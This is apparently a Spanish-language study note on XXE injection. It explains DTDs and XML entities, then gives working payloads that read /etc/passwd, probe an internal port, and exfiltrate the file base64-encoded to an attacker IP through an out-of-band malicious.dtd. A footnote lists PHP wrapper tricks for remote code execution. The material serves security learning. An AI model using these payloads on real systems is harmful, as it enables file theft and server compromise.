Para entender las inyecciones _XXE_, primero hay que entender que es una **DTD** dentro de _XML_:
**DTD** = _Document Type Definition_ o _DOCTYPE_. Es una parte opcional de un documento XML, definde su estructura, elementos permitidos, atributos,  entidades que se pueden usar. _Sirve_ para validar que el XML cumpla con cierto formato, indicando como deben organizarse los datos y que etiquetas son validas. E aqui el concepto **importante**: Existe 2 tipos de _DTD_:

* **DTD Interna**: Es la que viene incluida _directamente_ en el archivo XML, es decir, los elementos, se declaran y definen en el mismo archivo, se puede ver mas o menos asi.
 
![Screenshot](../../../Images/xxe1.png)

----------
* **DTD Externa**: Las entidades se definen en un archivo externo _.dtd_. y se veria mas o menos asi:

_Archivo DTD_ --> "Estructura.dtd"
```dtd
	<!ELEMENT persona (nombre, edad)>
	<!ELEMENT nombre (#PCDATA)>
	<!ELEMENT edad (#PCDATA)>
```

_Archivo XML_
```xml
<?xml version="1.0"?>
<!DOCTYPE persona SYSTEM "estructura.dtd">
<persona>
  <nombre>Fidel</nombre>
  <edad>18</edad>
</persona>
```

--------
# ⚠️ 

### En el DTD se pueden definir **entidades**

##### Aqui es donde aparecen las vulnerabilidades

## Que es una entidad?

Una _entidad_ es una especie de variable que almacena informacion y que el parser sustituye cuando se la llama: `&nombre_entidad;`. Hay 2 tipos de entidades:

* _Entidad Interna_: Estas entidades son declaradas dentro de la misma _DTD_ y son texto plano, sirve simplemente como variable o alias para reutilizar contenido. No accede a recursos externos, por lo tanto, es segura. Se declara de la siguiente manera (donde dice entity):
```xml
<!DOCTYPE ejemplo [
  <!ENTITY autor "Fidel">
]>
<root>&autor;</root>
```

--------
* _Entidad Externa_: Son entidades cuyo valor viene de un recurso externo. La diferencia con una _entidad interna_ es que su valor apunta a una fuente **afuera del documento** (aca aparecen las vulnerabilidades). Para llamar a recursos externos, se utilizan [^1] _URIs_.

Se declara de la siguiente manera:

```xml
	<!DOCTYPE ejemplo [
	  <!ENTITY datos SYSTEM "file:///etc/passwd">
	]>
	<root>&datos;</root>
``` 

------------
---------
-----------
### Como identificar que es vulnerable a XXE?

* *1ro*, identificar si parsea XML, buscando endpoins, un xmlmap, buscando archivos conocidos xml (_sitemap_index.xml_, _xmlrpc.php_) y probar haciendo solicitudes 

* _2do_, identificar si acepta _DTDs_, que se puede hacer enviando por curl, **al endpoint encontrado**, un .xml simple con el siguiente contenido:

```xml
<?xml version="1.0"?>
<!DOCTYPE test>
<root>fidel</root>
```

Si la respuesta es algo tipo `DOCTYPE not allowed`, **no parsea DTDs!**, posiblemente no haya _XXE_. Pero si lo acepta sin quejarse, puede llegar a haber _XXE_.

* _3ro_, identificar si acepta entidades, que tambien se puede hacer enviando un archivo asi por curl:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY test "OK">]>
<root>&test;</root>
```

Si la respuesta contiene **OK**, procesa entidades. Luego ya se puede probar enviando _entidades externas_.

------------
### Y que pasa si inyectamos codigo malicioso ahi?

Podemos ingresar la siguiente linea (<! DOCTYPE.....):
llamando asi, a una _DTD Interna_.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
	<root>
		<name>
		Fidel
		</name>
		<tel>
		ashd
		</tel>
		<email>
		&xxe; 
		</email>
		<password>
		asdpas
		</password>
	</root>
	```

Agregamos las lineas:

`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` --> Crea una entidad llamada **xxe** que contiene el archivo _/etc/passwd_

`&xxe;` --> Aca llamamos a la entidad _xxe_, donde esta **/etc/passwd**.

----------
### Tambien...
Tambien podemos hacer que la maquina victima se realice una peticion a si misma a un puerto interno, por ejemplo, el 8080 (puerto que se suele utilizar para pruebas, desarrollo, pagina de administracion, etc...)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]>
	<root>&xxe;</root>
```

-------------
--------
------------
# XXE OOB Blind

Si no muestra por pantalla el /etc/passwd, se puede obtener _/etc/passwd_ enviando el contenido hacia un servidor propio poniendo el siguiente doctype:

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.0.6/malicious.dtd"> %xxe;]>`

Esto hace un **GET** al archivo malicious.dtd de la ip atacante, que esta corriendo por http. En nuestro archivo malicious.dtd tenemos que especificar que es lo que queremos obtener:

```malicious.dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.0.6/?file=%file;'>">
%eval;
%exfil;
```

Usar `file://` puede llegar a causar problemas, por lo que utilizamos dicho _wrapper_, que codifica el recurso **/etc/passwd** a base64 y nos lo envia a nosotros por el puerto 80 (logicamente tenemos que estar en escucha). 
 
-----
------
------
### Indice

[^1]: **URIs**: Una _URI_ (Uniform Resource Identifier) es una cadena de texto que **identifica un recurso** (como un archivo, una página web o un servicio) de forma única y estándar en Internet o en un sistema local. Su función es permitir que distintas aplicaciones —navegadores, parsers, programas— puedan localizar y acceder a ese recurso sin ambigüedad. Hay distinos URIs: <br>`file:///etc/passwd` -> Busca archivos locales del sistema. <br>`http://example.com` -> Realiza peticiones a una url HTTP. <br>`https://example.com` -> Lo mismo, pero cifrado.<br>`ftp://ftp.example.com/pub/data.txt` -> Descarga archivos por FTP.<br>`php://filter/read=convert.base64-encode/resource=/etc/passwd` -> Realiza peticiones, en este caso a recursos locales, por medio de php, averiguar para ver bien las funciones.<br>`php://input` --> Luego agregar en el cuerpo de la respuesta -> `<?php system("whoami");?>` --> Tiene que enviarse por **POST** <br>`expect://whoami` -> MUY poco comun, pero si esta, permite RCE.<br>`data://text/plain;base64,PD9waHAgc3lzdGVtKFwid2hvYW1pXCIpOz8+` --> RCE, por GET<br>`php://filter.......` --> Usando el script php_filter_chain_generator.py, quizas podes obtener una RCE, averiguar mas pero es basicamente poner (en el parametro) <br>`?filename=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp` --> Todo este texto es para poner una H simplemente, pero vos insertas esto en la url y capaz se consigue RCE.








